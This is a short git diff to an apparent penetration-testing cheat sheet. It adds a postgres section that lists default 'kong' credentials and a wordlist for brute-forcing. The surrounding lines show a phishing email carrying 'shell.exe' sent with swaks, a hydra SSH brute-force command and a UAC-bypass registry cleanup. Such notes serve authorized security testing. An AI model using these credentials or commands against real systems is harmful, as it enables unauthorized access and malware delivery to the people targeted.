@@ -812,6 +812,14 @@ Remove-Item -Path "HKCU:\SOFTWARE\Classes\ms-settings" -Recurse -Force
 - with a credential, it is possible to use `swaks` to send emails
     * `swaks -t recipient@target.com --from attacker@target.com --attach shell.exe --server $SMTP_SERVER --body @body.txt --header "Subject: Update your informations" --suppress-data -ap`
 
+## postgres (5432)
+- bruteforce wordlists
+    - `./Default-Credentials/postgres-betterdefaultpasslist.txt`
+    - kong:kong
+    - kong@$HOST:kong
+    - kong:kongpass
+    - kong:KongFTW
+
 ## ssh
 - if password enabled, try brute with common credentials and/or password spraying
     - `hydra -l root -P passwords.txt -s 2222 ssh://1.2.3.4`
